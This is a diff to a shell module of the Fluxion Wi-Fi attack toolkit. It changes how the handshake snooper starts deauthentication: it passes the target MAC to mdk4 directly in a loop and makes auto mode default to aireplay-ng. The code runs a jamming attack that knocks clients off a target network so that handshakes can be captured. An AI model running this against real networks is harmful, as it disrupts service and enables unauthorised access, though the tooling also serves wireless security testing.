@@ -215,12 +215,6 @@ handshake_snooper_start_deauthenticator() {
     echo "Jammer interface already in monitor mode, skipping..." > $FLUXIONOutputDevice
   fi
 
-  # Prepare deauthenticators
-  case "$HandshakeSnooperDeauthenticatorIdentifier" in
-    "$HandshakeSnooperMdk4MethodOption")
-      echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
-  esac
-
   # Start deauthenticators.
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
@@ -231,7 +225,7 @@ handshake_snooper_start_deauthenticator() {
     "$HandshakeSnooperMdk4MethodOption")
       fluxion_window_open HandshakeSnooperDeauthenticatorPID \
         "Deauthenticating all clients on $FluxionTargetSSID" "$BOTTOMRIGHT" "#000000" "#FF0009" \
-        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done"
+        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -B $FluxionTargetMAC -c $FluxionTargetChannel; done"
     ;;
   esac
 }
@@ -248,7 +242,11 @@ handshake_snooper_set_deauthenticator_identifier() {
   handshake_snooper_unset_deauthenticator_identifier
 
   if [ "$FLUXIONAuto" ]; then
-    HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperMdk4MethodOption"
+    if [ "$FLUXIONDeauthMethod" = "mdk4" ]; then
+      HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperMdk4MethodOption"
+    else
+      HandshakeSnooperDeauthenticatorIdentifier="$HandshakeSnooperAireplayMethodOption"  # Default to aireplay-ng in auto mode until mdk4's traffic-wait issue is fixed upstream.
+    fi
     return 0
   fi
 
